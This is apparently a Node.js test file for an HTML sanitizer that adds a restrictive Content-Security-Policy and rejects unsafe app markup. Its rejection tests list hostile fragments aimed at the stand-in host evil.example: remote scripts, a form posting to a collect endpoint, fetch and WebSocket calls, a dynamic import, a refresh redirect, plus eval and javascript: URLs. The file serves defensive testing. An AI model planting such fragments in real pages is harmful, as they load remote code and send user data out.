import assert from "node:assert/strict";
import test from "node:test";
import { parseHtmlAppArtifact } from "./html-app-artifact.js";

const valid = '<!doctype html><html><head><title>Demo</title></head><body><main><h1>Demo</h1><button onclick="this.textContent=\'Done\'">Click</button><img src="data:image/png;base64,AA=="></main></body></html>';

test("accepts a complete standalone app and adds a restrictive CSP", () => {
  const result = parseHtmlAppArtifact(valid);
  assert.ok(result);
  assert.match(result, /Content-Security-Policy/);
  assert.match(result, /connect-src 'none'/);
  assert.match(result, /<main>/);
});

test("adds a head and CSP when a valid app omits the head element", () => {
  const result = parseHtmlAppArtifact('<html><body><main>App</main></body></html>');
  assert.ok(result);
  assert.match(result, /<head><meta http-equiv="Content-Security-Policy"/);
});

test("rejects remote executable and embedded resources", () => {
  for (const fragment of [
    '<script src="https://evil.example/a.js"></script>',
    '<link rel="stylesheet" href="//evil.example/a.css">',
    '<img src="https://evil.example/pixel.png">',
    '<iframe src="https://evil.example"></iframe>',
    '<form action="https://evil.example/collect"></form>',
    '<div style="background:url(https://evil.example/a.png)"></div>',
  ]) {
    assert.equal(parseHtmlAppArtifact(valid.replace("</main>", fragment + "</main>")), null, fragment);
  }
});

test("rejects network APIs, dynamic remote imports, script injection, and refresh redirects", () => {
  for (const fragment of [
    '<script>fetch("https://evil.example")</script>',
    '<script>new WebSocket("wss://evil.example")</script>',
    '<script>eval("alert(1)")</script>',
    '<script>import("https://evil.example/a.js")</script>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<a href="javascript:alert(1)">go</a>',
  ]) {
    assert.equal(parseHtmlAppArtifact(valid.replace("</main>", fragment + "</main>")), null, fragment);
  }
});

test("rejects incomplete, oversized, and non-app HTML", () => {
  assert.equal(parseHtmlAppArtifact("<html><body><main>broken"), null);
  assert.equal(parseHtmlAppArtifact("<html><body><p>not an app</p></body></html>"), null);
  assert.equal(parseHtmlAppArtifact("<html><body><main>" + "x".repeat(90000) + "</main></body></html>"), null);
});
